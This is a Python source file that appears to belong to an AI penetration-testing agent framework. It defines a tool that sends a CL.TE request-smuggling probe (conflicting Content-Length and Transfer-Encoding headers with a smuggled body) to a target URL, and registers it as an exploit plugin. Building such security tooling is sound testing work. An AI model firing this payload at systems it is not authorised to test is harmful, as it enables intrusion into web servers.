from __future__ import annotations

import json
import time
from typing import Dict, Optional

import requests

from cai.sdk.agents import function_tool
from cai.tools.web.plugin_registry import ExploitPlugin, REGISTRY


@function_tool(strict_mode=False)
def desync_probe(
    target_url: str,
    method: str = "POST",
    timeout_sec: int = 10,
    extra_headers: Optional[Dict[str, str]] = None,
) -> str:
    """
    Heuristic request-smuggling/desync probe using conflicting CL/TE headers.
    """
    headers = {
        "Content-Length": "4",
        "Transfer-Encoding": "chunked",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    if extra_headers:
        headers.update(extra_headers)

    body = "0\r\n\r\nG"
    start = time.monotonic()
    try:
        resp = requests.request(
            method=method.upper(),
            url=target_url,
            headers=headers,
            data=body,
            timeout=timeout_sec,
            allow_redirects=False,
            verify=False,
        )
        elapsed_ms = int((time.monotonic() - start) * 1000)
        suspicious = resp.status_code in (400, 408, 413, 421, 500, 502) and elapsed_ms > 1500
        return json.dumps(
            {
                "target_url": target_url,
                "status_code": resp.status_code,
                "elapsed_ms": elapsed_ms,
                "suspicious": suspicious,
                "headers_used": headers,
                "note": "Heuristic only. Confirm with front-end/back-end differential tests.",
            },
            ensure_ascii=True,
        )
    except Exception as exc:  # pylint: disable=broad-except
        return json.dumps(
            {"target_url": target_url, "error": str(exc), "headers_used": headers},
            ensure_ascii=True,
        )


REGISTRY.register(
    ExploitPlugin(
        name="desync_probe",
        category="request_smuggling",
        execute=desync_probe,
        description="CL.TE mismatch heuristic probe.",
    )
)
